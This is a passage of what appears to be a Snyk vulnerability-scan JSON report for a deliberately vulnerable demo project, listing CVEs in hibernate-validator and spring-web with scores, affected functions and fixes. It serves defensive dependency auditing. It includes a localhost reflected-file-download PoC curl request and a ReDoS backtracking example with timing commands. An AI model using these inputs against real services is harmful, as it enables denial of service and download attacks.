HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the userâ€™s browser.| \n|**DOM-based**|Client|The attacker forces the userâ€™s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.hibernate:hibernate-validator` to version 6.0.18.Final, 6.1.0.Final or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/r87b7e2d22982b4ca9f88f5f4f22a19b394d2662415b233582ed22ebf@%3Cnotifications.accumulo.apache.org%3E)\n- [GitHub Commit](https://github.com/hibernate/hibernate-validator/commit/124b7dd6d9a4ad24d4d49f74701f05a13e56ceee)\n- [Hibernator Security Release Blog](https://in.relation.to/2019/11/20/hibernate-validator-610-6018-released/)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10219)\n",
      "disclosureTime": "2018-10-18T14:55:21Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "org/hibernate/validator/internal/constraintvalidators/hv/SafeHtmlValidator.java",
            "className": "SafeHtmlValidator",
            "functionName": "getFragmentAsDocument"
          },
          "version": [
            "[,6.0.18.Final)",
            "[6.1.0.Alpha1,6.1.0.Final)"
          ]
        }
      ],
      "fixedIn": [
        "6.0.18.Final",
        "6.1.0.Final"
      ],
      "id": "SNYK-JAVA-ORGHIBERNATE-569100",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "CVE": [
          "CVE-2019-10219"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:02.408899Z",
      "moduleName": "org.hibernate:hibernate-validator",
      "packageManager": "maven",
      "packageName": "org.hibernate:hibernate-validator",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-01-09T14:55:12Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/r87b7e2d22982b4ca9f88f5f4f22a19b394d2662415b233582ed22ebf@%3Cnotifications.accumulo.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/124b7dd6d9a4ad24d4d49f74701f05a13e56ceee"
        },
        {
          "title": "Hibernator Security Release Blog",
          "url": "https://in.relation.to/2019/11/20/hibernate-validator-610-6018-released/"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10219"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "functions_new": [
        {
          "functionId": {
            "className": "org.hibernate.validator.internal.constraintvalidators.hv.SafeHtmlValidator",
            "functionName": "getFragmentAsDocument"
          },
          "version": [
            "[,6.0.18.Final)",
            "[6.1.0.Alpha1,6.1.0.Final)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,6.0.18.Final)",
          "[6.1.0.Alpha1,6.1.0.Final)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.hibernate",
        "artifactId": "hibernate-validator"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.github.derjust:spring-data-dynamodb@4.3.1",
        "org.hibernate:hibernate-validator@5.2.4.Final"
      ],
      "upgradePath": [
        false,
        "com.github.derjust:spring-data-dynamodb@5.0.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-validator",
      "version": "5.2.4.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-09-18T14:36:44.859594Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.6,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Improper Input Validation. The protections against Reflected File Download attacks from CVE-2015-5211 may be bypassed depending on the browser used through the use of a `jsessionid` path parameter.\n## Remediation\nUpgrade `org.springframework:spring-web` to version 4.3.29.RELEASE, 5.0.19.RELEASE, 5.1.18.RELEASE, 5.2.9.RELEASE or higher.\n## References\n- [CVE-2015-5211](https://tanzu.vmware.com/security/cve-2015-5211)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2020-5421)\n",
      "disclosureTime": "2020-09-18T14:23:55Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/web/util/WebUtils.java",
            "className": "WebUtils",
            "functionName": "parseMatrixVariables"
          },
          "version": [
            "[3.2.0.RELEASE,4.3.29.RELEASE)",
            "[5.0.0.RELEASE, 5.0.19.RELEASE)",
            "[5.1.0.RELEASE, 5.1.18.RELEASE)",
            "[5.2.0.RELEASE, 5.2.9.RELEASE)"
          ]
        }
      ],
      "fixedIn": [
        "4.3.29.RELEASE",
        "5.0.19.RELEASE",
        "5.1.18.RELEASE",
        "5.2.9.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-1009832",
      "identifiers": {
        "CWE": [
          "CWE-20"
        ],
        "CVE": [
          "CVE-2020-5421"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-01T15:06:12.285684Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-09-18T16:17:53Z",
      "references": [
        {
          "title": "CVE-2015-5211",
          "url": "https://tanzu.vmware.com/security/cve-2015-5211"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2020-5421"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.web.util.WebUtils",
            "functionName": "parseMatrixVariables"
          },
          "version": [
            "[3.2.0.RELEASE,4.3.29.RELEASE)",
            "[5.0.0.RELEASE, 5.0.19.RELEASE)",
            "[5.1.0.RELEASE, 5.1.18.RELEASE)",
            "[5.2.0.RELEASE, 5.2.9.RELEASE)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[3.2.0.RELEASE,4.3.29.RELEASE)",
          "[5.0.0.RELEASE, 5.0.19.RELEASE)",
          "[5.1.0.RELEASE, 5.1.18.RELEASE)",
          "[5.2.0.RELEASE, 5.2.9.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-web"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework:spring-web@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.0.13.RELEASE",
        "org.springframework:spring-web@5.2.12.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2021-05-26T07:50:29.017223Z",
      "credit": [
        "Trung Pham of Viettel Cyber Security"
      ],
      "cvssScore": 4.4,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Privilege Escalation. By recreating the temporary storage directory, a locally authenticated malicious user can read or modify files that have been uploaded to the WebFlux application, or overwrite arbitrary files with multipart request data.\n## Remediation\nUpgrade `org.springframework:spring-web` to version 5.3.7, 5.2.15.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/cce60c479c22101f24b2b4abebb6d79440b120d1)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/26931)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2021-22118)\n",
      "disclosureTime": "2021-05-26T07:43:20Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "5.3.7",
        "5.2.15.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-1296829",
      "identifiers": {
        "CWE": [
          "CWE-264"
        ],
        "CVE": [
          "CVE-2021-22118"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-09-17T15:25:00.232085Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-05-26T11:57:45Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/cce60c479c22101f24b2b4abebb6d79440b120d1"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/26931"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2021-22118"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Privilege Escalation",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[5.3.0,5.3.7)",
          "[5.0.0.RELEASE,5.2.15.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-web"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework:spring-web@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.1.6",
        "org.springframework:spring-web@5.3.13"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2016-12-25T16:51:51Z",
      "credit": [
        "Mariusz Luciow"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Information Exposure. It allows web applications to enable cross-domain requests via JSONP (JSON with Padding) through `AbstractJsonpResponseBodyAdvice` for REST controllers, and `MappingJackson2JsonView` for browser requests. When `MappingJackson2JsonView` is configured in an application, JSONP support is automatically ready to use through the `jsonp` and `callback` JSONP parameters, enabling cross-domain requests.\r\nAllowing cross-domain requests from untrusted origins may expose user information to 3rd party browser scripts.\n## Remediation\nUpgrade `org.springframework:spring-web` to version 4.3.18.RELEASE, 5.0.7.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/b80c13b722bb207ddf43f53a007ee3ddc1dd2e26)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/21338)\n- [Pivotal Security](https://pivotal.io/security/cve-2018-11040)\n",
      "disclosureTime": "2016-12-25T16:51:51Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/http/converter/json/MappingJacksonValue.java",
            "className": "MappingJacksonValue",
            "functionName": "setJsonpFunction"
          },
          "version": [
            "[4.3,4.3.18)",
            "[5.0,5.0.7)"
          ]
        }
      ],
      "fixedIn": [
        "4.3.18.RELEASE",
        "5.0.7.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-31689",
      "identifiers": {
        "CWE": [
          "CWE-200"
        ],
        "CVE": [
          "CVE-2018-11040"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:02.735179Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-25T16:51:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/b80c13b722bb207ddf43f53a007ee3ddc1dd2e26"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/21338"
        },
        {
          "title": "Pivotal Security",
          "url": "https://pivotal.io/security/cve-2018-11040"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Information Exposure",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.http.converter.json.MappingJacksonValue",
            "functionName": "setJsonpFunction"
          },
          "version": [
            "[4.3,4.3.18)",
            "[5.0,5.0.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[4.3.0.RELEASE,4.3.18.RELEASE)",
          "[5.0.0.RELEASE,5.0.7.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-web"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework:spring-web@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@2.0.0.RELEASE",
        "org.springframework:spring-web@5.1.3.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-07-16T07:45:04.278979Z",
      "credit": [
        "Mariusz Luciow"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Cross-Site Tracing (XST). It allows web applications to change the HTTP request method to any HTTP method (including TRACE) using the `HiddenHttpMethodFilter` in Spring MVC. If an application has a pre-existing XSS vulnerability, a malicious user (or attacker) can use this filter to escalate to an XST attack.\n## Remediation\nUpgrade `org.springframework:spring-web` to version 4.3.18.RELEASE, 5.0.7.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/dac97f1b7dac3e70ff603fb6fc9f205b95dd6b01)\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/f2694a8ed93f1f63f87ce45d0bb638478b426acd)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/21376)\n- [Pivotal Security](https://pivotal.io/security/cve-2018-11039)\n",
      "disclosureTime": "2016-12-25T16:51:51Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/web/filter/reactive/HiddenHttpMethodFilter.java",
            "className": "HiddenHttpMethodFilter",
            "functionName": "mapExchange"
          },
          "version": [
            "[5.0.0.RELEASE, 5.0.7.RELEASE)"
          ]
        },
        {
          "functionId": {
            "filePath": "org/springframework/web/filter/HiddenHttpMethodFilter.java",
            "className": "HiddenHttpMethodFilter",
            "functionName": "doFilterInternal"
          },
          "version": [
            "[4.3.0.RELEASE, 4.3.18.RELEASE)",
            "[5.0.0.RELEASE, 5.0.7.RELEASE)"
          ]
        }
      ],
      "fixedIn": [
        "4.3.18.RELEASE",
        "5.0.7.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-451604",
      "identifiers": {
        "CWE": [
          "CWE-284"
        ],
        "CVE": [
          "CVE-2018-11039"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-05T21:04:38.607039Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-12-25T16:51:51Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/dac97f1b7dac3e70ff603fb6fc9f205b95dd6b01"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/f2694a8ed93f1f63f87ce45d0bb638478b426acd"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/21376"
        },
        {
          "title": "Pivotal Security",
          "url": "https://pivotal.io/security/cve-2018-11039"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-Site Tracing (XST)",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.web.filter.reactive.HiddenHttpMethodFilter",
            "functionName": "mapExchange"
          },
          "version": [
            "[5.0.0.RELEASE, 5.0.7.RELEASE)"
          ]
        },
        {
          "functionId": {
            "className": "org.springframework.web.filter.HiddenHttpMethodFilter",
            "functionName": "doFilterInternal"
          },
          "version": [
            "[4.3.0.RELEASE, 4.3.18.RELEASE)",
            "[5.0.0.RELEASE, 5.0.7.RELEASE)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[4.3.0.RELEASE, 4.3.18.RELEASE)",
          "[5.0.0.RELEASE, 5.0.7.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-web"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework:spring-web@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@2.0.0.RELEASE",
        "org.springframework:spring-web@5.1.3.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2020-03-05T15:02:31.577470Z",
      "credit": [
        "Roman Shalymov"
      ],
      "cvssScore": 8,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Reflected File Download (RFD). A reflected file download attack is possible when the filename attribute of the `Content-Disposition` header is derived from user-supplied input.\r\n\r\n## PoC\r\n```\r\ncurl 'http://127.0.0.1:8080/?filename=sample&contents=Hello,%20World' --dump-header -\r\n```\n## Remediation\nUpgrade `org.springframework:spring-web` to version 5.2.3, 5.1.13, 5.0.16 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/41f40c6c229d3b4f768718f1ec229d8f0ad76d76)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/24220)\n- [Pivotal Vulnerability Report](https://pivotal.io/security/cve-2020-5398)\n- [PoC](https://github.com/motikan2010/CVE-2020-5398)\n",
      "disclosureTime": "2020-01-16T13:47:43Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/http/ContentDisposition$Builder.java",
            "className": "ContentDisposition$Builder",
            "functionName": "filename"
          },
          "version": [
            "[5.2.0, 5.2.3)",
            "[5.1.0, 5.1.13)",
            "[5.0.0, 5.0.16)"
          ]
        }
      ],
      "fixedIn": [
        "5.2.3",
        "5.1.13",
        "5.0.16"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-559346",
      "identifiers": {
        "CWE": [
          "CWE-494"
        ],
        "GHSA": [
          "GHSA-8wx2-9q48-vm9r"
        ],
        "CVE": [
          "CVE-2020-5398"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-10-28T10:46:24.776205Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-01-22T13:47:42Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/41f40c6c229d3b4f768718f1ec229d8f0ad76d76"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/24220"
        },
        {
          "title": "Pivotal Vulnerability Report",
          "url": "https://pivotal.io/security/cve-2020-5398"
        },
        {
          "title": "PoC",
          "url": "https://github.com/motikan2010/CVE-2020-5398"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Reflected File Download (RFD)",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.http.ContentDisposition$Builder",
            "functionName": "filename"
          },
          "version": [
            "[5.2.0, 5.2.3)",
            "[5.1.0, 5.1.13)",
            "[5.0.0, 5.0.16)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[5.2.0, 5.2.3)",
          "[5.1.0, 5.1.13)",
          "[5.0.0, 5.0.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-web"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework:spring-web@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.0.3.RELEASE",
        "org.springframework:spring-web@5.2.4.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2018-10-18T10:47:34.201366Z",
      "credit": [
        "Nicholas Starke"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). A malicious user could add a range header with a high number of ranges, or with wide ranges that overlap, or both, for a denial of service attack.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLetâ€™s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesnâ€™t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `org.springframework:spring-web` to version 4.3.20.RELEASE, 5.0.10.RELEASE, 5.1.1.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/423aa28ed584b4ff6e5bad218c09beef5e91951e)\n- [Pivotal Security Report](https://pivotal.io/security/cve-2018-15756)\n",
      "disclosureTime": "2018-10-03T10:44:07Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "org/springframework/http/HttpRange.java",
            "className": "HttpRange",
            "functionName": "parseRanges"
          },
          "version": [
            "[4.2.0, 4.3.20)",
            "[5.0.0, 5.0.10)",
            "[5.1.0, 5.1.1)"
          ]
        }
      ],
      "fixedIn": [
        "4.3.20.RELEASE",
        "5.0.10.RELEASE",
        "5.1.1.RELEASE"
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-72470",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-ffvq-7w96-97p7"
        ],
        "CVE": [
          "CVE-2018-15756"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:40:55.081576Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-18T10:43:53Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/423aa28ed584b4ff6e5bad218c09beef5e91951e"
        },
        {
          "title": "Pivotal Security Report",
          "url": "https://pivotal.io/security/cve-2018-15756"
        }
      ],
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.http.HttpRange",
            "functionName": "parseRanges"
          },
          "version": [
            "[4.2.0, 4.3.20)",
            "[5.0.0, 5.0.10)",
            "[5.1.0, 5.1.1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[4.2.0.RELEASE, 4.3.20.RELEASE)",
          "[5.0.0.RELEASE, 5.0.10.RELEASE)",
          "[5.1.0.RELEASE, 5.1.1.RELEASE)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.springframework",
        "artifactId": "spring-web"
      },
      "severityWithCritical": "low",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework:spring-web@5.0.6.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@2.0.0.RELEASE",
        "org.springframework:spring-web@5.1.3.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "5.0.6.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2022-03-29T10:05:31.971026Z",
      "credit": [
        "4ra1n"
      ],
      "cvssScore": 5.3,
